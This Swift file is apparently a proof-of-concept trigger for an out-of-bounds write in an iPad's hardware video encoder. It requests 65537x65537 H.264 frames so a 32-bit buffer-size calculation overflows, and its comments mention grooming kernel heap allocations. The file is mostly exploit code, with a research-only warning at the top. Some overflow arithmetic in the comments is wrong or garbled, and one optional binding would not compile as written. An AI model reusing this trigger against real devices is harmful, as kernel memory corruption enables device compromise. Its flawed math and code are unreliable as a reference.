//
//  AVE263Trigger.swift
//  iPad 8 iPadOS 26.3 AVE OOB trigger (CVE-2026-64747 class)
//  Chain: oversized dims -> CalcBufSize 32-bit mul overflow -> small buf -> OOB write
//  Requires: free dev signing on own iPad 8 (A12) running 23D127
//
//  WARNING: research only on owned hardware
//

import Foundation
import AVFoundation
import VideoToolbox

class AVETrigger {
    // Overflow math: w*h mod 2^32 must be a SMALL POSITIVE value
    // to bypass the `tbnz w8,#0x1f` (negative) check in DPB config at sub_a5ee7c
    // w = 65537 (0x10001): 65537^2 = 0x100020001, truncated = 0x20001 = 131073
    static func overflowDims() -> (Int, Int) { (65537, 65537) }

    // Alternative dims for different overflow targets (all pass negative check):
    //  0x18001*0x18001  -> 0x3C0001 + ... = 0x90001 (589825)
    //  0x20001*0x10001  -> 0x20001 (131073)
    //  target small values: 0x100..0x1000 for kalloc small-class grooming

    private var writer: AVAssetWriter?
    private var input: AVAssetWriterInput?

    func startEncodingSession() throws {
        let (w, h) = Self.overflowDims()
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("poc.mov")
        try? FileManager.default.removeItem(at: url)

        writer = try AVAssetWriter(url: url, fileType: .mov)
        let settings: [String: Any] = [
            AVVideoCodecKey: AVVideoCodecType.h264,
            AVVideoWidthKey: w,
            AVVideoHeightKey: h,
            AVVideoCompressionPropertiesKey: [
                AVVideoAverageBitRateKey: 1_000_000,
                AVVideoMaxKeyFrameIntervalKey: 30,
            ],
        ]
        input = AVAssetWriterInput(mediaType: .video, outputSettings: settings)
        guard let w2 = writer, let i2 = input else { return }
        if w2.canAdd(i2) { w2.add(i2) }
        w2.startWriting()
        w2.startSession(atSourceTime: .zero)

        // Feed frames to force actual encoding (AVE hardware path)
        // [VERIFY-3] confirm this reaches AppleAVE2 on A12
        if let adapter = AVAssetWriterInputPixelBufferAdaptor(
            assetWriterInput: i2, sourcePixelBufferAttributes: [
                kCVPixelBufferPixelFormatTypeKey as String: kCVPixelFormatType_32BGRA,
                kCVPixelBufferWidthKey as String: 64,
                kCVPixelBufferHeightKey as String: 64,
            ]) {
            var pb: CVPixelBuffer?
            CVPixelBufferCreate(kCFAllocatorDefault, 64, 64,
                                kCVPixelFormatType_32BGRA, nil, &pb)
            if let p = pb {
                adapter.append(p, withPresentationTime: .zero)
            }
        }
        i2.markAsFinished()
        w2.finishWriting { [weak self] in
            self?.done = true
        }
    }
    var done = false
}
